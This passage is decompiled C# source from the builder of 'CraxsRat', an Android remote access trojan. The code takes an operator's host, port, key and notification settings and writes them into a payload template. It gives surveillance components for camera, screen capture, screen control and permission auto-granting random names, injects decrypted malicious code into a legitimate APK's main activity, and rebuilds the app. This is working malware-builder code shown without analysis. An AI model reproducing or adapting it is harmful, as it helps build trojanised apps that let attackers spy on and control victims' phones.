										.Replace("USE-AUTOGRANT", _0024VB_0024Me.checkautoclick.Checked.ToString())
										.Replace("USE-ALLPRIM", _0024VB_0024Me.ASKPRIM_all.ToString())
										.Replace("fource.info", "false")
										.Replace("name.info", _0024VB_0024Me.CLiname.Text)
										.Replace("_the_port_", _0024VB_0024Me.newport)
										.Replace("_the_key_", _0024VB_0024Me.newkey)
										.Replace("_the_alive_", _0024VB_0024Me.newalive)
										.Replace("_usr_nam_", _0024VB_0024Me.newname)
										.Replace("_the_eco_", _0024VB_0024Me.neweco)
										.Replace("_C_N_L_", _0024VB_0024Me.newcnl)
										.Replace("_c_N_M_", _0024VB_0024Me.newcnm)
										.Replace("_NOTIFI_TITLE_", _0024VB_0024Me.titletext.Text)
										.Replace("_NOTIFI_MSG_", _0024VB_0024Me.msgtext.Text)
										.Replace("_send_mthd_", _0024VB_0024Me.newsndmthd)
										.Replace("_the_fouce_", _0024VB_0024Me.newsndmthd)
										.Replace("_the_fouce_", _0024VB_0024Me.newforuce)
										.Replace("_the_sokt_", _0024VB_0024Me.newsokt)
										.Replace("payload", Conversions.ToString(RuntimeHelpers.GetObjectValue(_0024VB_0024Me.RandomShit(_0024VB_0024ResumableLocal_min_num_002435, _0024VB_0024ResumableLocal_max_num_002436))))
										.Replace("_start_connect_", _0024VB_0024Me.newstrtconct)
										.Replace("_is_connected_", _0024VB_0024Me.newconect)
										.Replace("_ask_draw_", _0024VB_0024Me.N__ask_draw_)
										.Replace("[RANDOM-STRING]", _0024VB_0024Me.NEWRANDOM)
										.Replace("WackMeUpJob", _0024VB_0024Me.N_WackMeUpJob);
									File.WriteAllText(_0024VB_0024ResumableLocal_f_002439, _0024VB_0024ResumableLocal_text_002440);
									Thread.Sleep(1);
								}
								_0024VB_0024ResumableLocal_sourcePath_002441 = _0024VB_0024ResumableLocal_smlipath_002431 + "\\ginom\\alfa\\lib\\scan";
								_0024VB_0024ResumableLocal_searchPattern_002442 = "*.smali";
								_0024VB_0024ResumableLocal_i_002443 = 0;
								_0024S44 = Directory.GetFiles(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_searchPattern_002442, SearchOption.AllDirectories);
								for (_0024S45 = 0; _0024S45 < _0024S44.Length; _0024S45++)
								{
									_0024VB_0024ResumableLocal_fileName_002446 = _0024S44[_0024S45];
									if (_0024VB_0024ResumableLocal_fileName_002446.Contains("_ask_prim_") | _0024VB_0024ResumableLocal_fileName_002446.Equals("_ask_prim_"))
									{
										File.Move(Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446), Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446.Replace("_ask_prim_", _0024VB_0024Me.N__ask_prim_)));
									}
									if (_0024VB_0024ResumableLocal_fileName_002446.Contains("EngineWorkerins") | _0024VB_0024ResumableLocal_fileName_002446.Equals("EngineWorkerins"))
									{
										File.Move(Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446), Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446.Replace("EngineWorkerins", _0024VB_0024Me.N_newEngineWorkerins)));
									}
									if (_0024VB_0024ResumableLocal_fileName_002446.Contains("_access_ask_") | _0024VB_0024ResumableLocal_fileName_002446.Equals("_access_ask_"))
									{
										File.Move(Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446), Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446.Replace("_access_ask_", _0024VB_0024Me.N__access_ask_)));
									}
									if (_0024VB_0024ResumableLocal_fileName_002446.Contains("_srv_worker_") | _0024VB_0024ResumableLocal_fileName_002446.Equals("_srv_worker_"))
									{
										File.Move(Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446), Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446.Replace("_srv_worker_", _0024VB_0024Me.N__srv_worker_)));
									}
									if (_0024VB_0024ResumableLocal_fileName_002446.Contains("_cap_sc_") | _0024VB_0024ResumableLocal_fileName_002446.Equals("_cap_sc_"))
									{
										File.Move(Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446), Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446.Replace("_cap_sc_", _0024VB_0024Me.N_cap_sc_)));
									}
									if (_0024VB_0024ResumableLocal_fileName_002446.Contains("_ask_battary_") | _0024VB_0024ResumableLocal_fileName_002446.Equals("_ask_battary_"))
									{
										File.Move(Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446), Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446.Replace("_ask_battary_", _0024VB_0024Me.N__ask_battary_)));
									}
									if (_0024VB_0024ResumableLocal_fileName_002446.Contains("_update_app_") | _0024VB_0024ResumableLocal_fileName_002446.Equals("_update_app_"))
									{
										File.Move(Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446), Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446.Replace("_update_app_", _0024VB_0024Me.N_update_app_)));
									}
									if (_0024VB_0024ResumableLocal_fileName_002446.Contains("_ask_draw_") | _0024VB_0024ResumableLocal_fileName_002446.Equals("_ask_draw_"))
									{
										File.Move(Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446), Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446.Replace("_ask_draw_", _0024VB_0024Me.N__ask_draw_)));
									}
									if (_0024VB_0024ResumableLocal_fileName_002446.Contains("SCRActivity") | _0024VB_0024ResumableLocal_fileName_002446.Equals("SCRActivity"))
									{
										File.Move(Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446), Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446.Replace("SCRActivity", _0024VB_0024Me.N__SCRActivity_)));
									}
									if (_0024VB_0024ResumableLocal_fileName_002446.Contains("webviewer") | _0024VB_0024ResumableLocal_fileName_002446.Equals("webviewer"))
									{
										File.Move(Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446), Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446.Replace("webviewer", _0024VB_0024Me.N__webviewer_)));
									}
									if (_0024VB_0024ResumableLocal_fileName_002446.Contains("CamActivity") | _0024VB_0024ResumableLocal_fileName_002446.Equals("CamActivity"))
									{
										File.Move(Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446), Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446.Replace("CamActivity", _0024VB_0024Me.N__CamActivity_)));
									}
									if (_0024VB_0024ResumableLocal_fileName_002446.Contains("_scctrl_") | _0024VB_0024ResumableLocal_fileName_002446.Equals("_scctrl_"))
									{
										File.Move(Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446), Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446.Replace("_scctrl_", _0024VB_0024Me.N__scctrl_)));
									}
									if (_0024VB_0024ResumableLocal_fileName_002446.Contains("ClassGen"))
									{
										File.Move(Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446), Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446.Replace("ClassGen", _0024VB_0024Me.N_ClassGen)));
									}
									if (_0024VB_0024ResumableLocal_fileName_002446.Contains("WackMeUpJob") | _0024VB_0024ResumableLocal_fileName_002446.Equals("WackMeUpJob"))
									{
										File.Move(Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446), Path.Combine(_0024VB_0024ResumableLocal_sourcePath_002441, _0024VB_0024ResumableLocal_fileName_002446.Replace("WackMeUpJob", _0024VB_0024Me.N_WackMeUpJob)));
									}
									_0024VB_0024ResumableLocal_i_002443++;
									Thread.Sleep(1);
								}
							}
							catch (Exception ex9)
							{
								ProjectData.SetProjectError(ex9);
								Exception ex10 = ex9;
								_0024VB_0024ResumableLocal_ex_002447 = ex10;
								_0024VB_0024Me.logwork("Error : Encryption...\r\n" + _0024VB_0024ResumableLocal_ex_002447.Message);
								ProjectData.ClearProjectError();
							}
							_0024VB_0024Me.logwork("Injecting Main Activity...");
							try
							{
								_0024VB_0024ResumableLocal_Activity_002448 = _0024VB_0024Me.TheApkPath + "\\" + _0024VB_0024ResumableLocal_lnk_00242[0];
								if (File.Exists(_0024VB_0024ResumableLocal_Activity_002448))
								{
									_0024VB_0024ResumableLocal_MainReader_002449 = File.ReadAllLines(_0024VB_0024ResumableLocal_Activity_002448);
									_0024S50 = _0024VB_0024ResumableLocal_MainReader_002449.Length;
									_0024VB_0024ResumableLocal_index_002451 = 0;
									while (_0024VB_0024ResumableLocal_index_002451 <= _0024S50)
									{
										if (_0024VB_0024ResumableLocal_index_002451 == 0)
										{
											_0024VB_0024ResumableLocal_findmain_002452 = _0024VB_0024ResumableLocal_MainReader_002449[0].Split(' ');
											_0024VB_0024ResumableLocal_intentmain_002453 = _0024VB_0024ResumableLocal_findmain_002452[_0024VB_0024ResumableLocal_findmain_002452.Length - 1];
										}
										if (!_0024VB_0024ResumableLocal_MainReader_002449[_0024VB_0024ResumableLocal_index_002451].Contains(_0024VB_0024Me.CraxsRatkfvuiorkenfudpajrsnCraxsRatssvdweesdfwefdfsdf("XqgovOgiwNmuEisbFkaXwA==", _0024VB_0024Me.TK)) || !_0024VB_0024ResumableLocal_MainReader_002449[_0024VB_0024ResumableLocal_index_002451].ToLower().StartsWith(".method".ToLower()))
										{
											_0024VB_0024ResumableLocal_index_002451++;
											continue;
										}
										_0024VB_0024ResumableLocal_MainReader_002449[_0024VB_0024ResumableLocal_index_002451 + 1] = _0024VB_0024ResumableLocal_MainReader_002449[_0024VB_0024ResumableLocal_index_002451 + 1] + Environment.NewLine + _0024VB_0024Me.D(Resources.oncreatecode).Replace(_0024VB_0024Me.D("W3RyZ3RtYWluXQ=="), _0024VB_0024ResumableLocal_intentmain_002453);
										_0024VB_0024ResumableLocal_MainReader_002449[_0024VB_0024ResumableLocal_MainReader_002449.Length - 1] = _0024VB_0024ResumableLocal_MainReader_002449[_0024VB_0024ResumableLocal_MainReader_002449.Length - 1] + Environment.NewLine + Environment.NewLine + _0024VB_0024Me.D(_0024VB_0024Me.CraxsRatkfvuiorkenfudpajrsnCraxsRatssvdweesdfwefdfsdf(Resources.MainMith, _0024VB_0024Me.TK)).Replace(_0024VB_0024Me.D("W3RyZ3RtYWluXQ=="), _0024VB_0024ResumableLocal_intentmain_002453).Replace("MainReflectorScan", _0024VB_0024Me.N_ClassGen + "9");
										break;
									}
									File.WriteAllLines(_0024VB_0024ResumableLocal_Activity_002448, _0024VB_0024ResumableLocal_MainReader_002449);
								}
							}
							catch (Exception ex11)
							{
								ProjectData.SetProjectError(ex11);
								Exception ex12 = ex11;
								_0024VB_0024ResumableLocal_ex_002454 = ex12;
								ProjectData.ClearProjectError();
							}
							_0024VB_0024Me.logwork("-----------------" + Environment.NewLine + "All Done" + Environment.NewLine + "Building Apk...");
							goto end_IL_000b;
						}
						Codes.MyMsgBox("Connection error 1", "Can't connect to server please try again later", useno: false, Resources.error48px);
						goto end_IL_0007;
					}
					end_IL_000b:;
				}
				catch (Exception ex13)
				{
					ProjectData.SetProjectError(ex13);
					Exception ex14 = ex13;
					_0024VB_0024ResumableLocal_ex_002455 = ex14;
					ProjectData.ClearProjectError();
				}
				_0024VB_0024ResumableLocal_folder_building_002456 = "";
				_0024VB_0024ResumableLocal_path_apktool_002457 = "";
				_0024VB_0024ResumableLocal_vulTrack_002458 = 0;
				try
				{
					_0024VB_0024ResumableLocal_driv_002459 = _0024VB_0024Me.GetDriv();
					Thread.Sleep(_0024VB_0024Me._Time);
					_0024VB_0024ResumableLocal_folder_building_002456 = _0024VB_0024ResumableLocal_driv_002459 + "CraxsRat_Bilder";
					if (Environment.Is64BitOperatingSystem)
					{
						_0024VB_0024Me.folder_apktool = _0024VB_0024ResumableLocal_folder_building_002456 + "\\platformBinary64\\bin";
					}
					else
					{
						_0024VB_0024Me.folder_apktool = _0024VB_0024ResumableLocal_folder_building_002456 + "\\platformBinary32\\bin";
					}
					try
					{
						if (Directory.Exists(_0024VB_0024ResumableLocal_folder_building_002456) & _0024VB_0024Me.oncedelete)
						{
							_0024VB_0024Me.oncedelete = false;
							_0024VB_0024Me.logwork("Deleting old Files...");
							DeleteDirectory(_0024VB_0024ResumableLocal_folder_building_002456);
						}
					}
					catch (Exception ex15)
					{
						ProjectData.SetProjectError(ex15);
						Exception ex16 = ex15;
						_0024VB_0024ResumableLocal_ex_002460 = ex16;
						ProjectData.ClearProjectError();
					}
					_0024VB_0024ResumableLocal_path_apktool_002457 = reso.res_Path + "\\Lib\\platformBinary.zip";
					try
					{
						while (true)
						{
							_0024VB_0024Me.logwork("Extracting New Files...");
							if (!Directory.Exists(_0024VB_0024ResumableLocal_folder_building_002456))
							{
								Directory.CreateDirectory(_0024VB_0024ResumableLocal_folder_building_002456);
								continue;
							}
							_0024VB_0024ResumableLocal_vulTrack_002458 = 20;
							if (Directory.Exists(_0024VB_0024Me.folder_apktool))
							{
								break;
							}
							Directory.CreateDirectory(_0024VB_0024Me.folder_apktool);
						}
						_0024VB_0024ResumableLocal_vulTrack_002458 = 30;
						if (Directory.Exists(_0024VB_0024Me.folder_apktool))
						{
							try
							{
								if (Directory.GetFiles(_0024VB_0024Me.folder_apktool, "*.*").Count() == 0)
								{
									Codes.File_zip_Decompress(_0024VB_0024ResumableLocal_path_apktool_002457, _0024VB_0024ResumableLocal_folder_building_002456);
								}
							}
							catch (Exception ex17)
							{
								ProjectData.SetProjectError(ex17);
								Exception ex18 = ex17;
								_0024VB_0024ResumableLocal_ex_002461 = ex18;
								ProjectData.ClearProjectError();
							}
						}
						_0024VB_0024ResumableLocal_vulTrack_002458 = 35;
						while (true)
						{
							Thread.Sleep(_0024VB_0024Me._Time);
							_0024VB_0024Me.logwork("Read Configuration...");
							if (!(Directory.Exists(_0024VB_0024ResumableLocal_folder_building_002456) & Directory.Exists(_0024VB_0024Me.folder_apktool)))
							{
								break;
							}
							try
							{
								_0024VB_0024ResumableLocal_canRun_002462 = _0024VB_0024Me.CMD_running();
								if (_0024VB_0024ResumableLocal_canRun_002462)
								{
									_0024VB_0024ResumableLocal_vulTrack_002458 = 40;
									NewLateBinding.LateCall(NewLateBinding.LateGet(_0024VB_0024Me.CMD, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[1] { "cd " + _0024VB_0024Me.folder_apktool }, null, null, null, IgnoreReturn: true);
									NewLateBinding.LateCall(NewLateBinding.LateGet(_0024VB_0024Me.CMD, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[1] { "java -version" }, null, null, null, IgnoreReturn: true);
									_0024VB_0024Me.logwork("Check java installed...");
								}
							}
							catch (Exception ex19)
							{
								ProjectData.SetProjectError(ex19);
								Exception ex20 = ex19;
								_0024VB_0024ResumableLocal_ex_002463 = ex20;
								ProjectData.ClearProjectError();
								continue;
							}
							break;
						}
					}
					catch (Exception ex21)
					{
						ProjectData.SetProjectError(ex21);
						Exception ex22 = ex21;
						_0024VB_0024ResumableLocal_ex_002464 = ex22;
						_0024VB_0024Me.Close();
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception ex23)
				{
					ProjectData.SetProjectError(ex23);
					Exception ex24 = ex23;
					_0024VB_0024ResumableLocal_ex_002465 = ex24;
					ProjectData.ClearProjectError();
				}
				end_IL_0007:;
			}
			catch (Exception ex25)
			{
				ProjectData.SetProjectError(ex25);
				Exception exception = ex25;
				_0024State = -2;
				_0024Builder.SetException(exception);
				ProjectData.ClearProjectError();
				return;
			}
			num = -2;
			_0024State = -2;
			_0024Builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private System.Windows.Forms.Timer _Timer1;

	[AccessedThroughProperty("DrakeUIButtonIcon12")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _DrakeUIButtonIcon12;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel1")]
	[CompilerGenerated]
	private Panel _Panel1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon13")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon13;

	[AccessedThroughProperty("DGVSTORE")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DataGridView _DGVSTORE;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("loadworker")]
	private BackgroundWorker _loadworker;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("exitbtn")]
	private DrakeUIButtonIcon _exitbtn;

	[CompilerGenerated]
	[AccessedThroughProperty("storebtn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _storebtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("downloadworker")]
	private BackgroundWorker _downloadworker;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("b_ok")]
	private DrakeUIButtonIcon _b_ok;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon3")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon3;

	[CompilerGenerated]
	[AccessedThroughProperty("showworkbtn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIAvatar _showworkbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon4")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("DrakeUIButtonIcon5")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon5;

	public string loadingtext;

	public string conecttext;

	public bool stage1;

	public bool stage2;

	public bool loadsuccess;

	public bool loadfaild;

	public object need_write;

	public object need_read;

	public object need_forground;

	public object need_syswinow;

	public object need_boot;

	public object need_all;

	public object ASKPRIM_all;

	private string N__ask_prim_;

	private const string _ask_prim_ = "_ask_prim_";

	private string N__access_ask_;

	private const string _access_ask_ = "_access_ask_";

	private string N_newEngineWorkerins;

	private const string EngineWorkerins = "EngineWorkerins";

	private string N__srv_worker_;

	private const string _srv_worker_ = "_srv_worker_";

	private string N_cap_sc_;

	private const string _cap_sc_ = "_cap_sc_";

	private string N_update_app_;

	private const string _update_app_ = "_update_app_";

	private string N_WackMeUpJob;

	private const string WackMeUpJob = "WackMeUpJob";

	private string N_ClassGen;

	private const string ClassGen = "ClassGen";

	private string N__ask_draw_;

	private const string _ask_draw_ = "_ask_draw_";

	private string N__ask_battary_;

	private const string _ask_battary_ = "_ask_battary_";

	private string N__CamActivity_;

	private const string CamActivity = "CamActivity";

	private string N__SCRActivity_;

	private const string SCRActivity = "SCRActivity";

	private string N__webviewer_;

	private const string webviewer = "webviewer";

	private string N__scctrl_;

	private const string _scctrl_ = "_scctrl_";

	private string newgetbyts;

	private string newsrvrun;

	private string split1;

	private string split2;

	private string split3;

	private string split4;

	private string newhost;

	private string newport;

	private string newkey;

	private string newalive;

	private string newname;

	private string neweco;

	private string newconect;

	private string newsokt;

	private string newstrtconct;

	private string newcnl;

	private string newcnm;

	private string newsndmthd;

	private string newforuce;

	private string newplgs;

	private string NEWRANDOM;

	private int cou;

	private int cou3;

	private List<string> ALLPRIMSLIST;

	public string TK;

	public string appnamebuild;

	private string TheApkPath;

	public string folder_apktool;

	private object CMD;

	private bool FolderApk;

	private bool StartedZip;

	public Random rshit;

	public bool oncedelete;

	private int _Time;

	[SpecialName]
	private Random _0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init;

	[SpecialName]
	private Random _0024STATIC_0024RandomShit_00242021C88_0024r;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024RandomShit_00242021C88_0024r_0024Init;

	[SpecialName]
	private Random _0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init;

	private Random STATICCraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq2021C88r;

	private StaticLocalInitFlag STATICCraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq2021C88rInit;

	private Random STATICRandomShit2021C88r;

	private StaticLocalInitFlag STATICRandomShit2021C88rInit;

	private Random STATICGenerateRandomNumber202888Random_Number;

	private StaticLocalInitFlag STATICGenerateRandomNumber202888Random_NumberInit;

	[field: AccessedThroughProperty("logopic")]
	internal virtual PictureBox logopic
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("statustext")]
	internal virtual Label statustext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual System.Windows.Forms.Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Timer1_Tick;
			System.Windows.Forms.Timer timer = _Timer1;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("mainpanel")]
	internal virtual Panel mainpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon12
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon12_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon12;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon12 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon12;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual Panel Panel1
	{
		[CompilerGenerated]
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Panel1_MouseDown;
			Panel panel = _Panel1;
			if (panel != null)
			{
				panel.MouseDown -= value2;
			}
			_Panel1 = value;
			panel = _Panel1;
			if (panel != null)
			{
				panel.MouseDown += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon13
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon13_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon13;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon13 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon13;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUITabControl1")]
	internal virtual DrakeUITabControl DrakeUITabControl1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage1")]
	internal virtual TabPage TabPage1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage2")]
	internal virtual TabPage TabPage2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUIImageButton1")]
	internal virtual DrakeUIImageButton DrakeUIImageButton1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label7")]
	internal virtual Label Label7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Host")]
	internal virtual DrakeUITextBox Host
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TheKey")]
	internal virtual DrakeUITextBox TheKey
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Port")]
	internal virtual DrakeUITextBox Port
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CLiname")]
	internal virtual DrakeUITextBox CLiname
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUIAvatar5")]
	internal virtual DrakeUIAvatar DrakeUIAvatar5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label12")]
	internal virtual Label Label12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label11")]
	internal virtual Label Label11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("msgtext")]
	internal virtual DrakeUITextBox msgtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label10")]
	internal virtual Label Label10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("titletext")]
	internal virtual DrakeUITextBox titletext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label6")]
	internal virtual Label Label6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label8")]
	internal virtual Label Label8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label14")]
	internal virtual Label Label14
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label9")]
	internal virtual Label Label9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DataGridView DGVSTORE
	{
		[CompilerGenerated]
		get
		{
			return _DGVSTORE;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellEventHandler value2 = DGVSTORE_CellClick;
			DataGridView dataGridView = _DGVSTORE;
			if (dataGridView != null)
			{
				dataGridView.CellClick -= value2;
			}
			_DGVSTORE = value;
			dataGridView = _DGVSTORE;
			if (dataGridView != null)
			{
				dataGridView.CellClick += value2;
			}
		}
	}

	internal virtual BackgroundWorker loadworker
	{
		[CompilerGenerated]
		get
		{
			return _loadworker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
